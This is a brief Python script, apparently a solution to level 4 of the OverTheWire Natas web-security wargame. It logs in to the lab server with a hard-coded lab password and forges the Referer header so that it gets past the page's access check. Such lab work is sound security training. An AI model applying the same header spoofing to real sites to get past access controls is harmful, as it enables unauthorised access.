import requests

url="http://natas4.natas.labs.overthewire.org/"
referer="http://natas5.natas.labs.overthewire.org/"

s=requests.Session()
s.auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
s.headers.update({'referer':referer})

r=s.get(url)
print(r.text)
